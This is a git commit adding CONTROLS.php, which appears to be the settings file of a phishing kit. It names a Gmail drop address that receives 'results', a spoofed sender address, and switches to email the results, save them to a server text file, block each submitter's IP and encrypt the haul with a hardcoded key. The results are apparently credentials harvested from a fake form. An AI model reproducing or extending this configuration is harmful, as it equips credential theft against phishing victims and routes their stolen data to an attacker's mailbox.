27a68cf8f072d8fc071e45a2ecb6cfbfa827682f
jnjnjnjn4567 <63479587+jnjnjnjn4567@users.noreply.github.com>
2020-04-11 17:25:14 +0100

    Create CONTROLS.php

---
+++ CONTROLS.php
@@ -0,0 +1,10 @@
+<?php
+$Your_Email = "fidelityinternationalinc2016@gmail.com";  // Set your email
+$From_Address = "XXX@";  // Address your results will apear to come from
+$Send_Log=1;  // Sends results to above email
+$Save_Log=1;  // Saves results to server within a txt file
+$Abuse_Filter=0; // Abuse filter: This blocks users from sending you abuse
+$One_Time_Access=0; // One Time Access: This blocks the users ip after the form has been submitted i.e. prevents users sending fake forms
+$Encrypt=0; // Encrypt: This feature encrypts your results
+$Key = 	"232BBCD7D47A1192"; // This key is used to decrypt results and can be changed
+?>
